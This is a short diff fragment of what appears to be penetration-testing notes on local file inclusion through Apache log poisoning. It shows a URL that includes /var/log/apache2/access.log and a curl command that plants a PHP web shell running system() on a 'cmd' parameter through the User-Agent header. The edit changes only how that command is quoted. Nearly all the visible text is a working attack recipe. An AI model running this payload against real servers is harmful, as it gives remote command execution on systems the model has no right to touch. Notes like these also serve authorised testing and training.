@@ -26,7 +26,7 @@ http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
 
 (Control the User-Agent with burp suite or curl)
 ```shell
-curl -s --user-agent '<?php system($_GET["cmd"]); ?>' 'http://<SERVER_IP>:<PORT>/index.php'
+curl -s --user-agent "<?php system($_GET['cmd']); ?>" 'http://<SERVER_IP>:<PORT>/index.php'
 ```
 
 Execute on user-agent web shell
